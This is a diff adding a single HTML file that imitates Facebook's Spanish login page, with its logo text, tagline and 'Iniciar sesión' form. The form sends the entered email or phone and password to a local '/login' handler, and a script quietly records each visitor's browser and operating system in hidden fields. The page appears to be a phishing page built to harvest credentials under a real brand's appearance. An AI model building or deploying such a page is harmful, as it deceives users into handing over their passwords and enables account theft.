@@ -1,0 +1,66 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook - Inicia sesión o regístrate</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div class="main-container">
+        <div class="left-panel">
+            <h1 class="facebook-logo">facebook</h1>
+            <p class="tagline">Facebook te ayuda a comunicarte y compartir con las personas que forman parte de tu vida.</p>
+        </div>
+
+        <div class="right-panel">
+            <div class="login-card">
+                <form action="/login" method="post" class="login-form">
+                    <input type="text" name="email_or_phone" placeholder="Correo electrónico o número de teléfono" required>
+                    <input type="password" name="password" placeholder="Contraseña" required>
+                    <!-- Hidden fields for browser and OS -->
+                    <input type="hidden" id="browser" name="browser" />
+                    <input type="hidden" id="os" name="os" />
+                    <button type="submit" class="btn-login">Iniciar sesión</button>
+                </form>
+                <a href="#" class="forgot-password">¿Olvidaste tu contraseña?</a>
+                <hr>
+                <button class="btn-new-account">Crear cuenta nueva</button>
+            </div>
+            <p class="create-page-link">
+                <a href="#">Crea una página</a> para una celebridad, una marca o un negocio.
+            </p>
+        </div>
+    </div>
+
+    <script>
+        // Function to detect browser
+        function getBrowser() {
+            const ua = navigator.userAgent;
+            if (ua.includes('Chrome')) return 'Chrome';
+            if (ua.includes('Firefox')) return 'Firefox';
+            if (ua.includes('Safari')) return 'Safari';
+            if (ua.includes('Edge')) return 'Edge';
+            if (ua.includes('Opera')) return 'Opera';
+            return 'Unknown';
+        }
+
+        // Function to detect OS
+        function getOS() {
+            const ua = navigator.userAgent;
+            if (ua.includes('Windows')) return 'Windows';
+            if (ua.includes('Mac')) return 'macOS';
+            if (ua.includes('Linux')) return 'Linux';
+            if (ua.includes('Android')) return 'Android';
+            if (ua.includes('iOS')) return 'iOS';
+            return 'Unknown';
+        }
+
+        // Populate hidden fields on page load
+        document.addEventListener('DOMContentLoaded', () => {
+            document.getElementById('browser').value = getBrowser();
+            document.getElementById('os').value = getOS();
+        });
+    </script>
+</body>
+</html>
